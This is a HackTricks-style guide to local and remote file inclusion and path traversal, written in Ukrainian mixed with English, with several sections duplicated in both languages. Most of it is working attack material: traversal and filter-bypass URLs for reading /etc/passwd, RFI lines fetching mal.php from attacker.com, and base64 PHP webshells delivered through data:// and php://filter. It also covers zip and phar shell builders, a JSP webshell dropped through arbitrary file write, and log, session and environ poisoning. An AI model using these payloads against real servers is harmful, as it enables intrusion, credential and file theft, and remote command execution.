# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Файл завантажується з віддаленого сервера (Найкраще: ви можете записати код, і сервер його виконає). У php це **відключено** за замовчуванням (**allow_url_include**).\
**Local File Inclusion (LFI):** Сервер завантажує локальний файл.

Уразливість виникає, коли користувач якимось чином може контролювати файл, який буде завантажений сервером.

Уразливі **PHP функції**: require, require_once, include, include_once

Цікавий інструмент для експлуатації цієї уразливості: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE файли
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Змішавши кілька \*nix LFI списків і додавши більше шляхів, я створив цей:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Спробуйте також замінити `/` на `\`\
Спробуйте також додати `../../../../../`

Список, що використовує кілька технік для знаходження файлу /etc/password (щоб перевірити, чи існує вразливість), можна знайти [тут](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Злиття різних wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Спробуйте також замінити `/` на `\`\
Спробуйте також видалити `C:/` і додати `../../../../../`

Список, що використовує кілька технік для знаходження файлу /boot.ini (щоб перевірити, чи існує вразливість), можна знайти [тут](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Перевірте список LFI для linux.

## Основи LFI та обходи

Усі приклади стосуються Local File Inclusion, але також можуть бути застосовані до Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### послідовності обходу видаляються нерекурсивно
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Обхід додавання додаткових символів у кінець переданого рядка (обхід: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Це **виправлено з PHP 5.4**

### **Кодування**

Ви можете використовувати нестандартні кодування, такі як double URL encode (і інші):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### З наявної папки

Можливо, back-end перевіряє шлях до папки:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Дослідження директорій файлової системи на сервері

Файлову систему сервера можна досліджувати рекурсивно, щоб ідентифікувати директорії, а не лише файли, застосовуючи певні техніки. Цей процес включає визначення глибини директорії та перевірку наявності конкретних папок. Нижче наведено детальний метод для цього:

1. **Determine Directory Depth:** Визначте глибину вашої поточної директорії, успішно отримавши файл `/etc/passwd` (підходить, якщо сервер на базі Linux). Приклад URL може бути структурований таким чином, що вказує глибину три:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Перевірка папок:** Додайте назву підозрілої папки (наприклад, `private`) до URL, а потім поверніться до `/etc/passwd`. Додатковий рівень директорії вимагає збільшення глибини на одиницю:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Інтерпретуйте результати:** Відповідь сервера вказує, чи існує папка:
- **Помилка / Відсутній вивід:** Папка `private`, ймовірно, не існує в указаному місці.
- **Вміст `/etc/passwd`:** Наявність папки `private` підтверджується.
4. **Рекурсивне дослідження:** Виявлені папки можна додатково перевірити на наявність підкаталогів або файлів, використовуючи ту саму техніку або традиційні методи Local File Inclusion (LFI).

Для дослідження директорій у різних розташуваннях файлової системи відкоригуйте payload відповідно. Наприклад, щоб перевірити, чи містить `/var/www/` папку `private` (припускаючи, що поточна директорія знаходиться на глибині 3), використовуйте:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation — це метод, який застосовується для маніпуляції шляхами файлів у вебзастосунках. Його часто використовують для доступу до обмежених файлів, обходячи певні заходи безпеки, які додають додаткові символи наприкінці шляху файлу. Мета — сформувати шлях до файлу, який після змін завдяки заходу безпеки все одно вказуватиме на потрібний файл.

У PHP різні подання шляху файлу можуть розглядатися як еквівалентні через природу файлової системи. Наприклад:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, та `/etc/passwd/` усі вважаються тим самим шляхом.
- Коли останні 6 символів — `passwd`, додавання `/` (утворюючи `passwd/`) не змінює цільовий файл.
- Подібно, якщо до шляху файлу додається `.php` (наприклад `shellcode.php`), додавання `/.` наприкінці не змінить файл, до якого відбувається доступ.

Наведені приклади демонструють, як використовувати path truncation для доступу до `/etc/passwd`, що є поширеною ціллю через його чутливий вміст (інформація про облікові записи користувачів):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
У цих сценаріях кількість необхідних traversals може бути близько 2027, але це число може змінюватися залежно від конфігурації сервера.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) у поєднанні з додатковими dot segments та символами можуть використовуватися для навігації файловою системою, ефективно ігноруючи рядки, що додаються сервером.
- **Determining the Required Number of Traversals**: Методом спроб і помилок можна визначити точну кількість `../` послідовностей, необхідних для переходу до кореневого каталогу, а потім до `/etc/passwd`, при цьому нейтралізуючи будь-які додані рядки (наприклад, `.php`), але бажаний шлях (`/etc/passwd`) залишається недоторканим.
- **Starting with a Fake Directory**: Поширеною практикою є починати шлях з неіснуючого каталогу (наприклад, `a/`). Ця техніка використовується як пересторога або щоб задовольнити вимоги логіки розбору шляху сервером.

When employing path truncation techniques, важливо розуміти поведінку парсера шляху сервера та структуру файлової системи. Кожен сценарій може вимагати різного підходу, і часто необхідне тестування, щоб знайти найефективніший метод.

**Ця вразливість була виправлена в PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

У php це вимкнено за замовчуванням, тому що **`allow_url_include`** встановлено як **Off.** Воно має бути **On**, щоб працювати, і в такому випадку ви можете включити PHP файл з вашого сервера та отримати RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Якщо з якоїсь причини **`allow_url_include`** встановлено в **On**, але PHP **фільтрує** доступ до зовнішніх веб-сторінок, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), ви, наприклад, можете використати data protocol з base64, щоб декодувати b64 PHP code і egt RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> У попередньому коді фінальний `+.txt` було додано, бо атакуючому потрібен був рядок, який закінчується на `.txt`, тож рядок завершується ним і після b64 decode ця частина поверне лише сміття, а реальний PHP код буде включено (і, отже, виконано).
>
> Ще один приклад **not using the `php://` protocol**:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python кореневий елемент

У python у коді на кшталт цього:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Якщо користувач передає **absolute path** до **`file_name`**, **previous path is just removed**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Це очікувана поведінка згідно з [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Якщо компонент є абсолютним шляхом, всі попередні компоненти відкидаються, і об'єднання продовжується з абсолютного компоненту шляху.

## Java — перелік директорій

Схоже, якщо у вас є Path Traversal у Java і ви **запитуєте директорію** замість файлу, повертається **перелік вмісту директорії**. Це не відбувається в інших мовах (наскільки мені відомо).

## Топ 25 параметрів

Ось список топ 25 параметрів, які можуть бути вразливі до local file inclusion (LFI) vulnerabilities (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters allow perform basic **modification operations on the data** before being it's read or written. Існує 5 категорій фільтрів:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Видаляє теги з даних (все, що між символами "<" і ">")
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Перетворює в інше кодування (`convert.iconv.<input_enc>.<output_enc>`). Щоб отримати **список всіх кодувань**, що підтримуються, запустіть у консолі: `iconv -l`

> [!WARNING]
> Зловживаючи фільтром конверсії `convert.iconv.*`, ви можете **згенерувати довільний текст**, що може бути корисним для запису довільного тексту або для того, щоб функція типу include опрацювала довільний текст. Для докладнішої інформації див. [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Стискає вміст (корисно при екфільтрації великої кількості даних)
- `zlib.inflate`: Розпаковує дані
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Застаріле
- `mdecrypt.*` : Застаріле
- Other Filters
- Запустивши в php `var_dump(stream_get_filters());` ви можете знайти кілька **неочікуваних фільтрів**:
- `consumed`
- `dechunk`: зворотно декодує HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Частина "php://filter" нечутлива до регістру

### Використання php filters як oracle для читання довільних файлів

[**У цьому дописі**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) запропоновано техніку читання локального файлу без повернення його вмісту від сервера. Ця техніка базується на **булевій ексфільтрації файлу (по символу) з використанням php filters як oracle**. Це можливо, оскільки php filters можуть бути використані для збільшення тексту настільки, щоб php кинув виняток.

В оригінальному дописі є детальне пояснення техніки, а тут — швидкий підсумок:

- Використовуйте кодек **`UCS-4LE`** щоб залишити провідний символ тексту на початку та змусити довжину рядка зростати експоненційно.
- Це використовується, щоб згенерувати **дуже великий текст, коли початкову літеру вгадано правильно**, внаслідок чого php викличе **помилку**.
- Фільтр **dechunk** **видалить усе, якщо перший символ не є hex**, тому ми можемо дізнатися, чи перший символ — hex.
- Це, у поєднанні з попереднім (та іншими фільтрами залежно від вгаданої літери), дозволить нам вгадувати літеру на початку тексту, спостерігаючи, коли після достатньої кількості трансформацій вона перестане бути hex-символом. Бо якщо вона hex, dechunk її не видалить, а початкова бомба спричинить помилку php.
- Кодек **convert.iconv.UNICODE.CP930** перетворює кожну літеру на наступну (тобто після застосування кодека: a -> b). Це дозволяє визначити, чи перша літера, наприклад, `a`, бо якщо застосувати цей кодек 6 разів: a->b->c->d->e->f->g, літера перестане бути hex-символом, отже dechunk її не видаляє і виникає помилка php через множення з початковою бомбою.
- Використовуючи інші трансформації, такі як **rot13** на початку, можливо leak інші символи, наприклад n, o, p, q, r (і інші кодеки можна використати, щоб зсунути інші літери в hex-діапазон).
- Коли початковий символ — число, потрібно закодувати його в base64 і leak перші 2 літери, щоб leak число.
- Остаточна проблема — зрозуміти **як leak більше, ніж початкова літера**. Використовуючи фільтри, що змінюють порядок байтів, наприклад **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**, можна змінити порядок символів і помістити в першу позицію інші літери тексту.
- І щоб мати змогу отримати **further data** ідея полягає в тому, щоб **generate 2 bytes of junk data at the beginning** за допомогою **convert.iconv.UTF16.UTF16**, застосувати **UCS-4LE** щоб воно **pivot with the next 2 bytes**, та d**elete the data until the junk data** (це видалить перші 2 байти початкового тексту). Продовжуйте робити це, доки не досягнете бажаного біта для leak.

У дописі також було опубліковано інструмент для автоматизації: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout and php://stderr** to access the **file descriptors 0, 1 and 2** respectively (не зовсім зрозуміло, як це може бути корисно в атаці)

### zip:// and rar://

Завантажте Zip або Rar файл з PHPShell всередині і отримайте до нього доступ.\
Щоб мати змогу зловживати rar protocol, його **потрібно спеціально активувати**
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Зверніть увагу, що цей протокол обмежений конфігураціями php **`allow_url_open`** і **`allow_url_include`**

### expect://

Expect має бути активовано. Ви можете виконати код за допомогою цього:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Вкажіть ваш payload у параметрах POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Файл `.phar` може бути використаний для виконання PHP-коду, коли веб-застосунок використовує функції, такі як `include`, для завантаження файлів. Наведений нижче фрагмент PHP-коду демонструє створення файлу `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Щоб скомпілювати файл `.phar`, потрібно виконати таку команду:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

Після виконання буде створено файл з ім'ям `test.phar`, який потенційно може бути використаний для експлуатації Local File Inclusion (LFI) вразливостей.

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

У випадках, коли LFI лише читає файл без виконання PHP-коду всередині, через такі функції, як `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` або `filesize()`, можна спробувати експлуатувати вразливість десеріалізації. Ця вразливість пов'язана з читанням файлів через протокол `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

Для детального розуміння експлуатації вразливостей десеріалізації у контексті `.phar` файлів, зверніться до документу, наведеного нижче:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

Було можливо зловживати **any arbitrary file read from PHP that supports php filters**, щоб отримати RCE. Детальний опис можна [**знайти в цьому дописі**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Короткий підсумок: **3 byte overflow** в PHP heap був використаний, щоб **змінити ланцюг вільних чанків** певного розміру з метою мати змогу **записати будь-що за будь-якою адресою**, тому додали хук для виклику **`system`**.\
Було можливо алокувати чанки певних розмірів, зловживаючи додатковими php filters.

### More protocols

Інші протоколи

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

Перегляньте більше можливих [ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Write in memory or in a temporary file (not sure how this can be useful in a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accessing FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Запис у пам'ять або у тимчасовий файл (не впевнений, як це може бути корисно в a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Доступ до локальної файлової системи
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Доступ до HTTP(s) URL-ів
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Доступ до FTP(s) URL-ів
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Потоки стиснення
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Знаходить імена шляхів, що відповідають шаблону (Він не повертає нічого придатного для виводу, тому тут не дуже корисний)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Аудіопотоки (не корисно для читання довільних файлів)

## LFI via PHP's 'assert'

## LFI через PHP 'assert'

Local File Inclusion (LFI) risks in PHP are notably high when dealing with the 'assert' function, which can execute code within strings. This is particularly problematic if input containing directory traversal characters like ".." is being checked but not properly sanitized.

Ризики Local File Inclusion (LFI) у PHP особливо високі при роботі з функцією 'assert', яка може виконувати код у рядках. Це особливо проблематично, якщо введення, що містить символи directory traversal, такі як "..", перевіряється, але не належним чином санітизоване.

For example, PHP code might be designed to prevent directory traversal like so:

Наприклад, PHP-код може бути спроектований, щоб запобігти directory traversal таким чином:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Хоча це має на меті зупинити traversal, воно ненавмисно створює вектор для code injection. Щоб використати це для читання вмісту файлу, зловмисник може використати:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Аналогічно, для виконання довільних системних команд можна використовувати:
```plaintext
' and die(system("id")) or '
```
Важливо **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ця техніка застосовна у випадках, коли ви **контролюєте** **file path** для **PHP function**, яка буде **access a file**, але ви не побачите вміст файлу (наприклад простий виклик **`file()`**), хоча вміст не показується.

У [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) пояснюється, як blind path traversal може бути зловживано через PHP filter щоб **exfiltrate the content of a file via an error oracle**.

У короткому підсумку, техніка використовує кодування **"UCS-4LE"** щоб зробити вміст файлу настільки **великим**, що **PHP function**, яка відкриває файл, викличе **помилку**.

Потім, щоб leak перший символ, використовується фільтр `dechunk` разом з іншими, такими як `base64` або `rot13`, і нарешті фільтри `convert.iconv.UCS-4.UCS-4LE` та `convert.iconv.UTF16.UTF-16BE` використовуються, щоб розмістити інші символи на початку та leak їх.

**Функції, які можуть бути вразливими**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Для технічних деталей див. згадану публікацію!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Коли серверний код, який приймає/завантажує файли, будує шлях призначення, використовуючи дані під контролем користувача (наприклад, filename або URL) без канонізації та валідації, сегменти `..` та абсолютні шляхи можуть вийти за межі планованого каталогу і спричинити arbitrary file write. Якщо ви можете розмістити payload під web-exposed директорією, зазвичай ви отримуєте unauthenticated RCE, завантаживши webshell.

Типовий робочий процес експлуатації:
- Виявити write primitive в endpoint або background worker, який приймає path/filename і пише вміст на диск (наприклад, message-driven ingestion, XML/JSON command handlers, ZIP extractors тощо).
- Визначити web-exposed directories. Типові приклади:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Скласти traversal path, який вийде з наміреного storage directory в webroot, і включити в нього вміст webshell.
- Відкрити завантажений payload у браузері та виконувати команди.

Примітки:
- Вразлива служба, що виконує запис, може слухати на non-HTTP port (наприклад, JMF XML listener на TCP 4004). Головний веб-портал (інакший порт) пізніше віддаватиме ваш payload.
- На Java стеку ці записи файлів часто реалізовані простим конкатенуванням `File`/`Paths`. Відсутність canonicalisation/allow-listing — основний недолік.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Захист, що усуває цей клас вразливостей:
- Вирішувати до канонічного шляху і гарантувати, що він є нащадком базового каталогу зі списку дозволених.
- Відхиляти будь-який шлях, що містить `..`, абсолютні корені або літери дисків; віддавати перевагу згенерованим іменам файлів.
- Запускати writer від імені облікового запису з низькими правами й відокремити каталоги для запису від коренів, що обслуговуються.

## Remote File Inclusion

Пояснювалося раніше, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Якщо сервер Apache або Nginx є **вразливим до LFI** всередині функції include, ви можете спробувати отримати доступ до **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, помістити в **user agent** або в **GET parameter** php shell на кшталт **`<?php system($_GET['c']); ?>`** і включити цей файл

> [!WARNING]
> Зауважте, що **якщо ви використовуєте подвійні лапки** для shell замість **одинарних лапок**, подвійні лапки будуть змінені на рядок "_**quote;**_", **PHP викине помилку** і **нічого іншого виконано не буде**.
>
> Також переконайтеся, що ви **правильно записали payload**, інакше PHP буде видавати помилку щоразу при спробі завантажити файл логів, і у вас не буде другої можливості.

Це також можна зробити в інших логах, але **будь обережні,** код всередині логів може бути URL encoded і це може зруйнувати Shell. Заголовок **authorisation "basic"** містить "user:password" у Base64 і він декодується в логах. PHPShell можна вставити в цей заголовок.\
Інші можливі шляхи логів:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Через Email

**Надішліть лист** на внутрішній акаунт (user@localhost), що містить ваш PHP payload, наприклад `<?php echo system($_REQUEST["cmd"]); ?>`, і спробуйте включити пошту користувача, використовуючи шлях на кшталт **`/var/mail/<USERNAME>`** або **`/var/spool/mail/<USERNAME>`**

### Через /proc/\*/fd/\*

1. Завантажте велику кількість shells (наприклад: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), де $PID = PID процесу (можна brute forced) і $FD — файловий дескриптор (також можна brute forced)

### Через /proc/self/environ

Як у лог-файлі, відправте payload у User-Agent — він буде відображений у файлі /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Через завантаження

Якщо ви можете завантажити файл, просто інжектуйте shell payload у нього (наприклад: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Щоб файл залишався читабельним, найкраще вставляти цю інформацію в метадані pictures/doc/pdf

### Через завантаження ZIP файлу

Завантажте ZIP-файл, що містить стиснений PHP shell, і отримайте доступ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Через PHP sessions

Перевірте, чи вебсайт використовує PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
У PHP ці сесії зберігаються в _/var/lib/php5/sess\\_\[PHPSESSID]\_ файлах
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Встановіть cookie у `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Використайте LFI для включення файлу сесії PHP.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Через ssh

Якщо ssh активний, перевірте, який користувач використовується (/proc/self/status & /etc/passwd) і спробуйте отримати доступ до **\<HOME>/.ssh/id_rsa**

### **Через** **vsftpd** _**журнали**_

Журнали FTP-сервера vsftpd розташовані в _**/var/log/vsftpd.log**_. У випадку, якщо існує Local File Inclusion (LFI) вразливість і можливий доступ до відкритого vsftpd-сервера, можна розглянути такі кроки:

1. Інжектуйте PHP payload у поле username під час процесу входу.
2. Після інжекції використайте LFI, щоб витягти журнали сервера з _**/var/log/vsftpd.log**_.

### Через php base64 filter (using base64)

Як показано в [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter просто ігнорує символи, що не належать до base64. Ви можете скористатися цим, щоб обійти перевірку розширення файлу: якщо ви подасте base64, який закінчується на ".php", фільтр просто проігнорує "." і додасть "php" до base64. Ось приклад payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

